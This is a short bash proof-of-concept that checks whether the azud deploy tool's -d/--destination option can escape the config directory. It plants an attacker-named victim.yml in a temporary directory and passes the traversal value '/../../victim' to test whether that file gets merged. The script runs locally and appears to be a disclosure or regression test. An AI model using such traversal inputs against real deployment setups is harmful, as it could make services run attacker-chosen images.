#!/usr/bin/env bash
# JIT-07: -d/--destination can leave the config directory.
set -euo pipefail
AZUD_BIN=${AZUD_BIN:-azud}
command -v "$AZUD_BIN" >/dev/null || { echo "set AZUD_BIN to the azud binary" >&2; exit 1; }

T=$(mktemp -d)
trap 'rm -rf "$T"' EXIT
mkdir -p "$T/config" "$T/.azud"
cat >"$T/config/deploy.yml" <<'YAML'
service: shop
image: example/shop:v1
servers:
  web:
    hosts: [127.0.0.1]
proxy:
  host: shop.example.com
YAML
cat >"$T/victim.yml" <<'YAML'
service: attacker-owned
image: attacker/image:v1
YAML

OUT=$(cd "$T" && "$AZUD_BIN" -c config/deploy.yml -d '/../../victim' config 2>&1)
printf '%s\n' "$OUT"
if [[ "$OUT" == *"attacker-owned"* ]]; then
  printf 'VULNERABLE: destination traversal merged victim.yml from outside config/\n'
else
  printf 'traversal was blocked or did not merge\n'
fi
